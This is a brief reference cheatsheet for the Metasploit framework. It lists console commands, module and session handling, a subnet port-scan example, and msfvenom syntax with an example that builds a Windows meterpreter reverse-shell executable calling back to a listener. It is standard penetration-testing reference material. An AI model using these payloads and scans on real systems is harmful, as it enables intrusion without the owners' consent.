Metasploit Complete Cheatsheet

msfconsole — Start the console
msfupdate — Update Metasploit
msfvenom — Generate payloads
search <keyword> — Search modules
use <path/to/module> — Load a module
info — Show details of loaded module
back — Unload current module
show options — List required options
set <option> <value> — Set a value
unset <option> — Unset an option
setg <option> <value> — Set globally
check — Check if the target is vulnerable
run or exploit — Execute the module
show payloads — List available payloads
set PAYLOAD <payload> — Choose payload

Example:
set PAYLOAD windows/meterpreter/reverse_tcp
sessions — Show active sessions
sessions -i <id> — Interact with session
background — Background current session
kill <id> — Kill a session
Use for scanning, fuzzing, etc.
Example:
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
run
Basic syntax:
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>

Example Windows EXE:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

Common formats:
exe, elf, raw, asp, aspx, war, php, js, c, python
db_status — Check DB connection
hosts — List discovered hosts
services — List services
vulns — List vulnerabilities
loot — Show loot collected
